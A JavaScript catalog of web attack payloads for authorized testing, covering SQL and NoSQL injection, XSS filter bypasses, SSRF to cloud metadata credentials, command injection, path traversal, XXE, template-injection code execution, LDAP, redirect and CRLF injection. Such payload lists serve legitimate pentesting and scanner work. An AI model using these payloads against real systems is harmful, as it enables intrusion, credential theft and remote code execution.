// Curated catalog for authorized web application security testing.
// p = payload, t = technique, c = context (DBMS/OS/engine), n = optional note.

export const catalog = {
  sqli: {
    label: "SQL injection",
    items: [
      { p: "' OR '1'='1' -- ", t: "auth-bypass", c: "Generic" },
      { p: "admin' -- ", t: "auth-bypass", c: "Generic" },
      { p: "' OR 1=1#", t: "auth-bypass", c: "MySQL" },
      { p: "\") OR (\"1\"=\"1", t: "auth-bypass", c: "Generic" },
      { p: "' UNION SELECT NULL-- -", t: "union", c: "Generic", n: "increment NULLs until no error to find column count" },
      { p: "' UNION SELECT NULL,NULL-- -", t: "union", c: "Generic" },
      { p: "' UNION SELECT NULL,@@version-- -", t: "union", c: "MySQL" },
      { p: "' UNION SELECT NULL,version()-- -", t: "union", c: "PostgreSQL" },
      { p: "' UNION SELECT NULL,banner FROM v$version-- -", t: "union", c: "Oracle" },
      { p: "' AND extractvalue(1,concat(0x7e,version()))-- -", t: "error", c: "MySQL" },
      { p: "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -", t: "error", c: "MySQL" },
      { p: "' AND 1=convert(int,@@version)-- -", t: "error", c: "MSSQL" },
      { p: "' AND 1=CAST((SELECT version()) AS int)-- -", t: "error", c: "PostgreSQL" },
      { p: "' AND 1=1-- -", t: "boolean", c: "Generic", n: "pair with the 1=2 case to confirm" },
      { p: "' AND 1=2-- -", t: "boolean", c: "Generic" },
      { p: "' AND sleep(5)-- -", t: "time", c: "MySQL" },
      { p: "'; SELECT pg_sleep(5)-- -", t: "time", c: "PostgreSQL" },
      { p: "'; WAITFOR DELAY '0:0:5'-- -", t: "time", c: "MSSQL" },
      { p: "' AND 1=dbms_pipe.receive_message('a',5)-- -", t: "time", c: "Oracle" },
      { p: "'/**/OR/**/1=1-- -", t: "waf-evasion", c: "Generic", n: "comment as whitespace" },
      { p: "'%0aOR%0a1=1-- -", t: "waf-evasion", c: "Generic" },
      { p: "' oR/**/1=1-- -", t: "waf-evasion", c: "Generic", n: "mixed case + inline comment" },
    ],
  },

  xss: {
    label: "Cross-site scripting",
    items: [
      { p: "<script>alert(1)</script>", t: "reflected", c: "HTML body" },
      { p: "\"><script>alert(1)</script>", t: "reflected", c: "HTML body", n: "breaks out of an attribute first" },
      { p: "<img src=x onerror=alert(1)>", t: "reflected", c: "HTML body" },
      { p: "<svg/onload=alert(1)>", t: "reflected", c: "HTML body" },
      { p: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", t: "reflected", c: "HTML body" },
      { p: "\" onmouseover=alert(1) x=\"", t: "attribute", c: "Attribute value" },
      { p: "\" autofocus onfocus=alert(1) x=\"", t: "attribute", c: "Attribute value", n: "fires without interaction" },
      { p: "'-alert(1)-'", t: "script", c: "Inline JS string" },
      { p: "javascript:alert(1)", t: "uri", c: "href / src sink" },
      { p: "#<img src=x onerror=alert(1)>", t: "dom", c: "location.hash sink" },
      { p: "<scr<script>ipt>alert(1)</scr</script>ipt>", t: "filter-bypass", c: "naive tag stripping" },
      { p: "<img src=x onerror=alert&lpar;1&rpar;>", t: "filter-bypass", c: "HTML entity in handler" },
      { p: "<iMg sRc=x OnErRoR=alert(1)>", t: "filter-bypass", c: "case folding" },
      { p: "<a href=\"jav&#x09;ascript:alert(1)\">x</a>", t: "filter-bypass", c: "tab break in scheme" },
    ],
  },

  ssrf: {
    label: "Server-side request forgery",
    items: [
      { p: "http://169.254.169.254/latest/meta-data/", t: "cloud-metadata", c: "AWS" },
      { p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", t: "cloud-metadata", c: "AWS", n: "grab role then creds" },
      { p: "http://metadata.google.internal/computeMetadata/v1/", t: "cloud-metadata", c: "GCP", n: "needs Metadata-Flavor: Google header" },
      { p: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", t: "cloud-metadata", c: "Azure" },
      { p: "http://127.0.0.1:80/", t: "localhost", c: "Generic" },
      { p: "http://localhost/", t: "localhost", c: "Generic" },
      { p: "http://[::1]/", t: "localhost", c: "IPv6" },
      { p: "http://127.1/", t: "bypass", c: "short form" },
      { p: "http://2130706433/", t: "bypass", c: "decimal IP" },
      { p: "http://0x7f000001/", t: "bypass", c: "hex IP" },
      { p: "http://0177.0.0.1/", t: "bypass", c: "octal IP" },
      { p: "http://localhost#@example.com/", t: "bypass", c: "fragment trick" },
      { p: "file:///etc/passwd", t: "scheme", c: "file" },
      { p: "gopher://127.0.0.1:6379/_INFO%0d%0a", t: "scheme", c: "gopher / redis" },
      { p: "dict://127.0.0.1:11211/stats", t: "scheme", c: "dict / memcached" },
    ],
  },

  cmdi: {
    label: "Command injection",
    items: [
      { p: "; id", t: "separator", c: "Unix" },
      { p: "| id", t: "separator", c: "Unix" },
      { p: "|| id", t: "separator", c: "Unix" },
      { p: "&& id", t: "separator", c: "Unix" },
      { p: "`id`", t: "substitution", c: "Unix" },
      { p: "$(id)", t: "substitution", c: "Unix" },
      { p: "%0aid", t: "separator", c: "Unix", n: "newline injection" },
      { p: "& whoami", t: "separator", c: "Windows" },
      { p: "| whoami", t: "separator", c: "Windows" },
      { p: "&& systeminfo", t: "separator", c: "Windows" },
      { p: "; sleep 5", t: "time-based", c: "Unix", n: "blind confirmation" },
      { p: "| ping -n 5 127.0.0.1", t: "time-based", c: "Windows" },
      { p: ";${IFS}id", t: "bypass", c: "Unix", n: "IFS for blocked spaces" },
      { p: ";c\\at${IFS}/etc/passwd", t: "bypass", c: "Unix", n: "backslash to dodge keyword filter" },
    ],
  },

  lfi: {
    label: "Path traversal / LFI",
    items: [
      { p: "../../../../etc/passwd", t: "traversal", c: "Unix" },
      { p: "..%2f..%2f..%2f..%2fetc%2fpasswd", t: "traversal", c: "Unix", n: "URL-encoded slashes" },
      { p: "%2e%2e%2f%2e%2e%2fetc%2fpasswd", t: "traversal", c: "Unix" },
      { p: "....//....//....//etc/passwd", t: "bypass", c: "Unix", n: "for naive ../ stripping" },
      { p: "..\\..\\..\\windows\\win.ini", t: "traversal", c: "Windows" },
      { p: "..%5c..%5c..%5cwindows%5cwin.ini", t: "traversal", c: "Windows" },
      { p: "../../../../etc/passwd%00", t: "bypass", c: "Unix", n: "null byte, legacy PHP" },
      { p: "php://filter/convert.base64-encode/resource=index.php", t: "wrapper", c: "PHP", n: "read source without execution" },
      { p: "php://filter/read=string.rot13/resource=index.php", t: "wrapper", c: "PHP" },
      { p: "expect://id", t: "wrapper", c: "PHP", n: "needs expect module" },
      { p: "/proc/self/environ", t: "traversal", c: "Unix", n: "log poisoning target" },
    ],
  },

  xxe: {
    label: "XML external entity",
    items: [
      { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", t: "file-read", c: "Classic" },
      { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", t: "file-read", c: "PHP", n: "for files with XML-breaking chars" },
      { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>", t: "ssrf", c: "Cloud" },
      { p: "<!DOCTYPE r [<!ENTITY % ext SYSTEM \"https://example.com/xxe.dtd\"> %ext;]>", t: "oob", c: "Blind", n: "use a controlled DTD endpoint for out-of-band confirmation" },
    ],
  },

  ssti: {
    label: "Server-side template injection",
    items: [
      { p: "{{7*7}}", t: "detect", c: "Jinja2/Twig" },
      { p: "${7*7}", t: "detect", c: "Freemarker/JSP-EL" },
      { p: "#{7*7}", t: "detect", c: "Ruby/Thymeleaf" },
      { p: "{{7*'7'}}", t: "detect", c: "Jinja2", n: "returns 7777777 vs 49 to fingerprint engine" },
      { p: "{{config}}", t: "exploit", c: "Jinja2", n: "leaks app config" },
      { p: "{{cycler.__init__.__globals__.os.popen('id').read()}}", t: "exploit", c: "Jinja2" },
      { p: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", t: "exploit", c: "Freemarker" },
      { p: "${T(java.lang.Runtime).getRuntime().exec('id')}", t: "exploit", c: "Spring SpEL" },
    ],
  },

  nosqli: {
    label: "NoSQL injection",
    items: [
      { p: "{\"$ne\": null}", t: "auth-bypass", c: "MongoDB", n: "JSON body, drop into password field" },
      { p: "{\"$gt\": \"\"}", t: "auth-bypass", c: "MongoDB" },
      { p: "username[$ne]=admin&password[$ne]=x", t: "auth-bypass", c: "MongoDB", n: "URL-encoded form variant" },
      { p: "username[$regex]=^adm&password[$ne]=x", t: "extraction", c: "MongoDB", n: "blind charwise extraction" },
      { p: "';return(true);var a='", t: "js-injection", c: "$where" },
    ],
  },

  ldap: {
    label: "LDAP injection",
    items: [
      { p: "*", t: "wildcard", c: "Generic" },
      { p: "*)(uid=*))(|(uid=*", t: "auth-bypass", c: "Generic" },
      { p: "admin*)((|userPassword=*)", t: "auth-bypass", c: "Generic" },
      { p: "*)(|(objectClass=*))", t: "enumeration", c: "Generic" },
    ],
  },

  redirect: {
    label: "Open redirect",
    items: [
      { p: "//example.com", t: "scheme-relative", c: "Generic" },
      { p: "/\\example.com", t: "bypass", c: "Generic", n: "backslash normalized to //" },
      { p: "https:example.com", t: "bypass", c: "Generic", n: "missing slashes" },
      { p: "//example.com/%2f..", t: "bypass", c: "Generic" },
      { p: "https://trusted.example.com.evaluator.example", t: "bypass", c: "Generic", n: "domain confusion" },
      { p: "https://trusted.example.com@example.com", t: "bypass", c: "Generic", n: "userinfo trick" },
    ],
  },

  crlf: {
    label: "CRLF / header injection",
    items: [
      { p: "%0d%0aSet-Cookie:%20sessid=injected", t: "response-split", c: "Generic" },
      { p: "%0d%0aLocation:%20https://example.com", t: "response-split", c: "Generic" },
      { p: "%0d%0a%0d%0a<script>alert(1)</script>", t: "xss-via-crlf", c: "Generic" },
      { p: "%E5%98%8D%E5%98%8ASet-Cookie:%20sessid=injected", t: "bypass", c: "Generic", n: "unicode CR/LF when raw is filtered" },
    ],
  },

  fuzz: {
    label: "Fuzzing / boundaries",
    items: [
      { p: "'", t: "special-char", c: "Generic" },
      { p: "\"", t: "special-char", c: "Generic" },
      { p: "`", t: "special-char", c: "Generic" },
      { p: "\\", t: "special-char", c: "Generic" },
      { p: "{{}}", t: "special-char", c: "Generic" },
      { p: "${}", t: "special-char", c: "Generic" },
      { p: "<>", t: "special-char", c: "Generic" },
      { p: "%00", t: "special-char", c: "Generic" },
      { p: "-1", t: "boundary", c: "numeric" },
      { p: "0", t: "boundary", c: "numeric" },
      { p: "2147483648", t: "boundary", c: "numeric", n: "int32 overflow" },
      { p: "A".repeat(1024), t: "boundary", c: "length", n: "1KB buffer" },
    ],
  },
};

// Pull the distinct techniques (or contexts) for a category, preserving first-seen order.
export function distinct(catKey, field) {
  const seen = [];
  for (const it of catalog[catKey].items) {
    if (!seen.includes(it[field])) seen.push(it[field]);
  }
  return seen;
}
